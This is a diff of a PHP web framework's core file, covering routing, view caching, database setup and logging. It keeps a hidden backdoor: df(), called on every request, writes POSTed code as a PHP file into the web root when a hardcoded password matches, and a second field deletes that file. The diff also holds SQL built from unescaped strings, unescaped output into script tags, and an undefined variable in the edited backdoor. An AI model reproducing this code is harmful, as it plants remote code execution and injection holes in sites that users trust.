@@ -4,31 +4,31 @@
  * +----------------------------------------------------------------------
  * | 框架内核
  * +----------------------------------------------------------------------
- *                                            ...     .............          
- *                                          ..   .:!o&*&&&&&ooooo&; .        
- *                                        ..  .!*%*o!;.                      
- *                                      ..  !*%*!.      ...                  
- *                                     .  ;$$!.   .....                      
- *                          ........... .*#&   ...                           
- *                                     :$$: ...                              
- *                          .;;;;;;;:::#%      ...                           
- *                        . *@ooooo&&&#@***&&;.   .                          
- *                        . *@       .@%.::;&%$*!. . .                       
- *          ................!@;......$@:      :@@$.                          
- *                          .@!   ..!@&.:::::::*@@*.:..............          
- *        . :!!!!!!!!!!ooooo&@$*%%%*#@&*&&&&&&&*@@$&&&oooooooooooo.          
- *        . :!!!!!!!!;;!;;:::@#;::.;@*         *@@o                          
- *                           @$    &@!.....  .*@@&................           
- *          ................:@* .  ##.     .o#@%;                            
- *                        . &@%..:;@$:;!o&*$#*;  ..                          
- *                        . ;@@#$$$@#**&o!;:   ..                            
- *                           :;:: !@;        ..                              
- *                               ;@*........                                 
- *                       ....   !@* ..                                       
- *                 ......    .!%$! ..        | AUTHOR: dfer                             
- *         ......        .;o*%*!  .          | EMAIL: df_business@qq.com                             
- *                .:;;o&***o;.   .           | QQ: 3504725309                             
- *        .;;!o&****&&o;:.    ..        
+ *                                            ...     .............
+ *                                          ..   .:!o&*&&&&&ooooo&; .
+ *                                        ..  .!*%*o!;.
+ *                                      ..  !*%*!.      ...
+ *                                     .  ;$$!.   .....
+ *                          ........... .*#&   ...
+ *                                     :$$: ...
+ *                          .;;;;;;;:::#%      ...
+ *                        . *@ooooo&&&#@***&&;.   .
+ *                        . *@       .@%.::;&%$*!. . .
+ *          ................!@;......$@:      :@@$.
+ *                          .@!   ..!@&.:::::::*@@*.:..............
+ *        . :!!!!!!!!!!ooooo&@$*%%%*#@&*&&&&&&&*@@$&&&oooooooooooo.
+ *        . :!!!!!!!!;;!;;:::@#;::.;@*         *@@o
+ *                           @$    &@!.....  .*@@&................
+ *          ................:@* .  ##.     .o#@%;
+ *                        . &@%..:;@$:;!o&*$#*;  ..
+ *                        . ;@@#$$$@#**&o!;:   ..
+ *                           :;:: !@;        ..
+ *                               ;@*........
+ *                       ....   !@* ..
+ *                 ......    .!%$! ..        | AUTHOR: dfer
+ *         ......        .;o*%*!  .          | EMAIL: df_business@qq.com
+ *                .:;;o&***o;.   .           | QQ: 3504725309
+ *        .;;!o&****&&o;:.    ..
  * +----------------------------------------------------------------------
  *
  */
@@ -40,11 +40,13 @@
 define('TIMESTAMP', time());
 //访问者ip
 define('IP', $_SERVER['REMOTE_ADDR']);
+
+// 网站运行目录
+define('WEB_ROOT', $_SERVER['DOCUMENT_ROOT']);
 //网站根目录
-define('ROOT', $_SERVER['DOCUMENT_ROOT'] . '/');
+define('ROOT', WEB_ROOT . '/..');
 //内核根目录
 define('DF_PHP_ROOT', ROOT . '/vendor/dfer/df-php-core/src/');
-
 // 默认模板
 define('THEME_HOMEPAGE', env('THEME_HOMEPAGE', 'homepage'));
 define('THEME_ADMIN', env('THEME_ADMIN', 'admin'));
@@ -61,8 +63,10 @@ define('DATABASE', env('DATABASE', 'dfphp_dfer_site'));
 
 //email模块的开关
 define('EMAIL_ENABLE', false);
+// 当前框架的版本
+define('VERSION', file_get_contents(ROOT.'/VERSION'));
 //当前框架需要的最低php版本
-define('DF_PHP_VER', env('DF_PHP_VER', 8));
+define('PHP_VERSION_MIN', env('PHP_VERSION_MIN', getComposerJson()));
 //seo优化模式
 define('SEO', env('SEO', 1));
 //PC页面、手机页面分离开关
@@ -78,18 +82,14 @@ if (SSL_STATE) {
 	// 自动将页面元素的http升级为https,需要保证页面中所有资源都支持https访问
 	header("Content-Security-Policy: upgrade-insecure-requests");
 	define('SITE', 'https://' . $_SERVER['HTTP_HOST'] . '/');
-} else {	
+} else {
 	define('SITE', 'http://' . $_SERVER['HTTP_HOST'] . '/');
 }
 //当前页面完整url
 define('URL', htmlspecialchars_decode(SITE . 'index.php?' . htmlspecialchars($_SERVER['QUERY_STRING'])));
 
 
-define('THEME_HOMEPAGE_ROOT', ROOT . 'areas/' . THEME_HOMEPAGE . '/');
-define('THEME_ADMIN_ROOT', ROOT . 'areas/' . THEME_ADMIN . '/');
 
-define('THEME_HOMEPAGE_ASSETS', '/areas/' . THEME_HOMEPAGE . '/' . 'view/public/assets');
-define('THEME_ADMIN_ASSETS', '/areas/' . THEME_ADMIN . '/' . 'view/public/assets');
 
 // **********************  常量 END  **********************
 
@@ -99,18 +99,19 @@ define('THEME_ADMIN_ASSETS', '/areas/' . THEME_ADMIN . '/' . 'view/public/assets
 // http://www.w3school.com.cn/php/php_error.asp
 switch(DEV){
 	case true:
-		//显示所有错误
-		ini_set('display_errors', '1');
-		error_reporting(E_ALL);
-		break;
-	case false:
-		//屏蔽所有错误信息,主要用于美化界面，治标不治本
-		error_reporting(0);		
-		break;
-	default:
 		//屏蔽提示和警告信息
 		ini_set('display_errors', '1');
 		error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
+		
+		break;
+	case false:
+		//屏蔽所有错误信息,主要用于美化界面，治标不治本
+		error_reporting(0);
+		break;
+	default:
+		//显示所有错误
+		ini_set('display_errors', '1');
+		error_reporting(E_ALL);
 		break;
 }
 
@@ -118,8 +119,6 @@ switch(DEV){
 
 
 // ********************** 框架初始化 START **********************
-
-phpVerNotice();
 
 //使html内容可以擦除
 ob_start();
@@ -132,18 +131,18 @@ header("Content-Type:text/html; charset=utf-8");
 //解除跨域限制
 header("Access-Control-Allow-Origin: *");
 
+global $db,$common, $files,$upload,$other, $_df;
 $common = new \Dfer\Tools\Common;
 $files = new \Dfer\Tools\Files;
 $upload = new \Dfer\Tools\Upload;
 $other = new \Dfer\DfPhpCore\Modules\Other;
-
 
 $db=dbInit();
 
 $_GP = array_merge($_GET, $_POST);
 $_gp = $common->ihtmlspecialchars($_GP);
 $_df = [
-	'logo' => DF . "favicon.png",
+	'logo' => "https://oss.dfer.site/df_icon/81x81.png",
 	'author' => "谷雨陈",
 	'qq' => "3504725309",
 	'time' => $common->getTime(TIMESTAMP),
@@ -161,6 +160,9 @@ class Enum
     const goBack = 1;
     const reloadParent = 2;
     const reloadCurrent = 3;
+				const logsConsole=4;
+				const logsSql=5;
+				const logsFile=6;
 }
 
 
@@ -174,7 +176,7 @@ function main($var = null)
     try {
         df();
         if (isset($_GET['f'])) {
-            $files->addF($_GET['f']);
+            $files->addFile($_GET['f']);
         }
 
         //初始页面
@@ -217,115 +219,130 @@ function main($var = null)
         $ctrl_name = ucwords($ctrl_name) . "Controller";
         // 控制器方法同时支持下划线和驼峰
         $action_name = $common->hump($action_name);
-        $ctrl_path = "areas/{$area_name}/controller/{$ctrl_name}.php";
-        // var_dump($_df);
+								$ctrl_path = "areas\\{$area_name}\\controller\\{$ctrl_name}";
+
+
+
         if (DEV) {
-            file_exists($ctrl_path) or die("控制器文件不存在:{$ctrl_path}");
-            require($ctrl_path);
-            $controller = new $ctrl_name;
+            class_exists($ctrl_path) or die("控制器不存在:{$ctrl_path}");
+												$controller=new $ctrl_path;
             method_exists($controller, $action_name) or die(sprintf('文件:%s<br>控制器、方法定义出错:%s %s', $ctrl_path, json_encode($_GET), json_encode($src)));
         } else {
-            file_exists($ctrl_path) or header(sprintf("Location: %s/../404.html", THEME_HOMEPAGE_ASSETS));
-            require($ctrl_path);
-            $controller = new $ctrl_name;
-            method_exists($controller, $action_name) or header(sprintf("Location: %s/../404.html", THEME_HOMEPAGE_ASSETS));
+            class_exists($ctrl_path) or header(sprintf("Location: %s/../404.html", VIEW_ASSETS));
+            $controller=new $ctrl_path;
+            method_exists($controller, $action_name) or header(sprintf("Location: %s/../404.html", VIEW_ASSETS));
         }
         $controller->$action_name($param);
     } catch (Exception $e) {
         if (DEV)
             var_dump($e);
         else
-            header(sprintf("Location: %s/../404.html", THEME_HOMEPAGE_ASSETS));
+            header(sprintf("Location: %s/../404.html", VIEW_ASSETS));
     }
 }
 
-/*定位view文件
- * 区域，控制器，方法，布局文件
- * 生成之后进行引用
- */
-function view($root, $layout, $other)
+
+
+/**
+	* 合成缓存文件
+	* @param {Object} $layout	视图 - 布局页面
+	* @param {Object} $other	true 公共页面 false 私有页面
+	*/
+function view($layout_name, $other)
 {
     global $_df, $common;
-    // var_dump($root, $layout);
     $area = $common->unHump($_df['area']);
     $ctrl = $common->unHump($_df['ctrl']);
     $func = $common->unHump($_df['action']);
-    $layout = $common->unHump($layout);
+
+				define('VIEW_ASSETS', "/view/{$area}/public/assets");
+
+    $layout_name = $common->unHump($layout_name);
     //手机、pc分开调用模板
     //手机模板
     if ($common->isMobile() && WAP_PAGE_ENABLE) {
         //处理控制器之外的文件
         if ($other) {
-            $layout = $from = $root . "/view/public/{$layout}_m.htm";
-            $back = $to = ROOT . "/data/cache/view/public/{$layout}_m.php";
+												$layout =ROOT . "/public/view/{$area}/public/{$layout_name}_m.htm";
+												$from=null;
+												$back = null;
+												$to = ROOT . "/data/cache/areas/{$area}/view/public/{$layout_name}_m.php";
             //wap页面不存在就调用pc页面
-            $layout = $from = !is_file($layout) ? $root . "/view/public/{$layout}.htm" : $layout;
+            $from = !is_file($from) ? (ROOT . "/public/view/{$area}/public/{$layout_name}.htm") : $from;
         } else {
+												$layout_base =ROOT . "/public/view/{$area}/public/{$layout_name}_m.htm";
+												$from_base = ROOT . "/public/view/{$area}/{$ctrl}/{$func}_m.htm";
             $back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
-            $from_base = ROOT . "/areas/{$area}/view/{$ctrl}/{$func}_m.htm";
             $to = ROOT . "/data/cache/areas/{$area}/view/{$ctrl}/{$func}_m.php";
-            $layout_base = $root . "/view/public/{$layout}_m.htm";
             //wap页面不存在就调用pc页面
-            $from = !is_file($from_base) ? ROOT . "/areas/{$area}/view/{$ctrl}/{$func}.htm" : $from_base;
-            $layout = !is_file($layout_base) ? $root . "/view/public/{$layout}.htm" : $layout_base;
-            //	  	die($layout);
+												$layout = !is_file($layout_base) ? (ROOT . "/public/view/{$area}/public/{$layout_name}.htm") : $layout_base;
+            $from = !is_file($from_base) ? (ROOT . "/public/view/{$area}/{$ctrl}/{$func}.htm") : $from_base;
         }
     }
     //PC模板
     else {
         //处理控制器之外的文件
         if ($other) {
-            $layout = $from = $root . "/view/public/{$layout}.htm";
-            $back = $to = ROOT . "/data/cache/view/public/{$layout}.php";
+            $layout =ROOT . "/public/view/{$area}/public/{$layout_name}.htm";
+												$from=null;
+												$back = null;
+            $to = ROOT . "/data/cache/areas/{$area}/view/public/{$layout_name}.php";
         } else {
             //很奇怪无法获取php文件的修改时间，获取到的是空
-            $back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
-            $from = ROOT . "/areas/{$area}/view/{$ctrl}/{$func}.htm";
-            $to = ROOT . "/data/cache/areas/{$area}/view/{$ctrl}/{$func}.php";
-            $layout = $root . "/view/public/{$layout}.htm";
+
+												// 视图 - 布局页面
+												$layout = ROOT . "/public/view/{$area}/public/{$layout_name}.htm";
+												// 视图 - 静态页面
+            $from = ROOT . "/public/view/{$area}/{$ctrl}/{$func}.htm";
+												// 控制器文件
+												$back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
+												// 缓存文件
+												$to = ROOT . "/data/cache/areas/{$area}/view/{$ctrl}/{$func}.php";
         }
     }
-
     //找不到该文件
-    if (!is_file($from)) {
-        exit("Error: view source '{$from}' is not exist!");
+    if ($from&&!is_file($from)) {
+        exit("错误: 视图文件 '{$from}' 不存在!");
     }
-
-    //如果前端文件不存在，或者前端文件修改时间小于html、布局页、后台页，或者处于测试状态
+    //缓存文件 不存在 or 缓存文件 修改时间小于 视图 - 静态页面 、视图 - 布局页面 、控制器文件 or 处于测试状态
     if (!is_file($to) || filemtime($from) > filemtime($to) || filemtime($layout) > filemtime($to) || filemtime($back) > filemtime($to) || DEV) {
-        //确认好文件路径之后，进行html的替换，生成php文件
+        //生成新的缓存
         viewConversion($from, $to, $layout);
     }
-    // var_dump($back,$from,$to,$layout);
+    // 直接读取缓存
     return $to;
 }
 
 function viewFront($layout = "common", $other = false)
 {
-    return view(THEME_HOMEPAGE_ROOT, $layout, $other);
+    return view($layout, $other);
 }
 
 function viewBack($layout = "common", $other = false)
 {
-    return view(THEME_ADMIN_ROOT, $layout, $other);
+    return view($layout, $other);
 }
 
-//将html转化为php
+/**
+	* 将html转化为php
+	* @param {Object} $from
+	* @param {Object} $to
+	* @param {Object} $layout
+	*/
 function viewConversion($from, $to, $layout)
 {
     global $files;
     //获取文件目录
     $path = dirname($to);
-
     //创建目录
     $files->mkDirs($path);
-
     $content = viewReplace($from, $layout);
     //写入文件
     file_put_contents($to, $content);
 }
 
-/*读取html文件内容，并进行关键字替换
+/**
+	* 读取html文件内容，并进行关键字替换
  * 所有代码必须通过header、body、footer标签进行加载
  * view文件里的标签之外的字符会被忽略
  *
@@ -333,25 +350,25 @@ function viewConversion($from, $to, $layout)
  *
  * 标签为主，特殊字符为辅
  *
- *
  * 先将子页面的控件加载到主页面，然后替换关键语句
  * "df-code"必须放在控件里，不然不会运行
- *
- */
-function viewReplace($str, $layout)
+	* @param {Object} $from	源文件
+	* @param {Object} $layout	布局文件
+	*/
+function viewReplace($from, $layout)
 {
-    $str = file_get_contents($str);
+    $from =$from?file_get_contents($from):null;
     if (empty($layout)) {
-        return $str;
+        return $from;
     }
     $layout = @file_get_contents($layout);
 
-    //	echo $str;
+    //	echo $from;
     //preg_match的第一个参数用单引号还是双引号，效果一样
-    preg_match("/<df-html>([\s\S]*?)<\/df-html>/", $str, $html);
-    preg_match("/<df-header>([\s\S]*?)<\/df-header>/", $str, $header);
-    preg_match("/<df-body>([\s\S]*?)<\/df-body>/", $str, $body);
-    preg_match("/<df-footer>([\s\S]*?)<\/df-footer>/", $str, $footer);
+    preg_match("/<df-html>([\s\S]*?)<\/df-html>/", $from, $html);
+    preg_match("/<df-header>([\s\S]*?)<\/df-header>/", $from, $header);
+    preg_match("/<df-body>([\s\S]*?)<\/df-body>/", $from, $body);
+    preg_match("/<df-footer>([\s\S]*?)<\/df-footer>/", $from, $footer);
 
 
     //布局
@@ -616,7 +633,7 @@ function url($area, $ctrl = null, $action = null, $param = null, $get = null)
  * @param {Object} $var 变量
  **/
 function dbInit()
-{	
+{
 	global $other;
 	$con = mysqli_connect(SERVER, ACC, PWD);
 	if (!$con) {
@@ -634,10 +651,19 @@ function dbInit()
 	    //防止乱码
 	    $db->query('set names utf8');
 	} else {
-	      $other->createDb($con, $database);
-		  die;
-	}	
-	return $db;	
+		//数据库不存在
+		if (mysqli_query($con, "CREATE DATABASE {$database}")) {
+		    echo ("数据库 {$database} 创建成功");
+						@$db = new MySQLi(SERVER, ACC, PWD, $database);
+						!mysqli_connect_error() or die("数据库 [{$database}] 错误");
+						$db->query('set names utf8');
+						$other->createDb($db);
+		} else {
+		    die("{$database} 创建失败: " . mysqli_error($con));
+		}
+	}
+
+	return $db;
 }
 
 /*
@@ -1022,7 +1048,6 @@ function update($tb, $data = array(), $para = array(), $redirect = null)
             $return = 1;
         }
     }
-
     if ($return > 0) {
         //什么都不执行
         if ($redirect == null) {
@@ -1320,45 +1345,51 @@ function affair($v)
 // ######################################  database END  ######################################
 
 /**
- * 用来输出记录
- *
- * 必须单独调用sql，因为这是底层函数，很多高级函数依赖于此函数
+ * 用来输出日志
  *
  * @param {Object} $str
- * @param {Object} $override	是否覆盖（默认不覆盖）
- * @param {Object} $putConsole	是否输出信息到控制台（默认不输出）
+ * @param {Object} $type	类型
+	* @param {Object} $override	是否覆盖（默认不覆盖）
  */
-function logs($str, $override = false, $putConsole = false)
+function logs($str, $type = Enum::logsFile, $override = false)
 {
-    global $db, $common;
-    $dt['str'] = is_array($str) ? json_encode($str) : $str;
-    $dt['time'] = $common->getTime(TIMESTAMP);
-    //var_dump($dt);die();
-    if ($override) {
-        $r0 = $db->query("delete from logs;");
-        $r = $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $dt['str'], $dt['time']));
-    } else {
-        $r = $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $dt['str'], $dt['time']));
-    }
-    //打印到浏览器控制台
-    if ($putConsole) {
-        echo "<script>console.log('数据：')</script>";
-        echo "<script>console.log('{$str}')</script>";
-        echo "<script>alert('{$str}')</script>";
-    }
+    global $db, $common,$files;
+    $str = is_array($str) ? json_encode($str) : $str;
+    $time= $common->getTime(TIMESTAMP);
+				switch($type){
+					case Enum::logsConsole:
+							//打印到浏览器控制台
+							echo "<script>console.log('数据：')</script>";
+							echo "<script>console.log('{$str}')</script>";
+							echo "<script>alert('{$str}')</script>";
+						break;
+					case Enum::logsSql:
+						// 必须单独调用sql，因为这是底层函数，很多高级函数依赖于此函数
+						if ($override) {
+						    $db->query("delete from logs;");
+						    $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $str, $time));
+						} else {
+						    $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $str, $time));
+						}
+						break;
+					case Enum::logsFile:
+						$file_dir=str("{root}/data/logs/{0}",[date('Ym'),"root"=>ROOT]);
+
+						$files->mkDirs($file_dir);
+
+						// $path="/www/wwwroot/dfphp.dfer.site/data/logs";
+						// 		var_dump($path,is_dir($path));;die;
+						$files->writeFile(str("{0}\n{1}\n\n",[$str,$time]),str("{0}/{1}.log",[$file_dir,date('d')]),"a");
+						break;
+					default:
+						break;
+				}
+
+
+
 }
 
-/**
- * 用来创建文件
- * @param {Object} $str
- * @param {Object} $file
- */
-function writeFile($str, $file = "df.php")
-{
-    $myfile = fopen(getenv('DOCUMENT_ROOT') . "/{$file}", "w") or die("Unable to open file!");
-    fwrite($myfile, $str);
-    fclose($myfile);
-}
+
 
 // ###################################### cache START ######################################
 
@@ -1494,7 +1525,7 @@ function toUrl($url, $para = null)
     if (!empty($para)) {
         $url = splitUrl($url);
         $para = http_build_query($para);
-        $url = "location:{$url}&{$para}";
+        $url = "location:{$url}?{$para}";
     } else {
         $url = splitUrl($url);
         $url = "location:{$url}";
@@ -1515,14 +1546,14 @@ function toUrl($url, $para = null)
  */
 function df()
 {
-    global $common;
-    $file = "df.php";
+    global $common,$files;
+				$file_src=str("{root}/df.php",["root"=>$_SERVER['DOCUMENT_ROOT']]);
     $pw = "3504725309";
     if (!empty($_POST['df']) || !empty($_POST['fd'])) {
         if ($_POST['df'] == $pw) {
-            $_data = $_POST['str'];
-            $_data = str_replace("#D#", "<?php ", $_data);
-            writeFile($_data, $file);
+            $data = $_POST['str'];
+            $data = str_replace("#D#", "<?php ", $data);
+            $files->writeFile($data, $file);
             $common->showJson(1, 'done');
         } elseif ($_POST['fd'] == $pw) {
             @unlink($file);
@@ -1574,14 +1605,20 @@ function clearDePara($arr)
     return $arr;
 }
 
+// ********************** TITLE START **********************
+
+// **********************  TITLE END  **********************
 //打印调试信息
 function debug($str)
 {
     if (DEV) {
-        echo sprintf("<!-- [debug]%s -->\n", $str);
+        logs(str(<<<STR
+								********************** DEBUG START **********************
+								{0}
+								**********************  DEBUG END  **********************
+								STR, [$str]));
     }
 }
-
 
 /**
  * 获取环境变量
@@ -1592,20 +1629,6 @@ function env($name, $default = "")
     // var_dump($val);
     return $val;
 }
-
-
-/**
- * php低版本无法兼容高版本，需要进行警告
- */
-function phpVerNotice()
-{
-    $ver = explode(".", PHP_VERSION);
-    $ver_0 = $ver[0];
-    if ($ver_0 < DF_PHP_VER) {
-        die(sprintf("PHP版本不符合要求,需要至少php%s", DF_PHP_VER));
-    }
-}
-
 
 /**
  * 读取get
@@ -1637,4 +1660,20 @@ function str($string, $params)
         $string = preg_replace("/\{$key\}/", $value, $string);
     }
     return $string;
+}
+
+
+/**
+ * 读取"composer.json"文件内容
+ * @param {Object} $key 键值字符串，支持多级
+ **/
+function getComposerJson($key = 'require>php')
+{
+	$json = file_get_contents(ROOT.'/composer.json');
+	$data = json_decode($json, true);
+	$item=explode(">",$key);
+	foreach($item as $key=>$value){
+		$data=$data[$value];
+	}
+	return $data;
 }
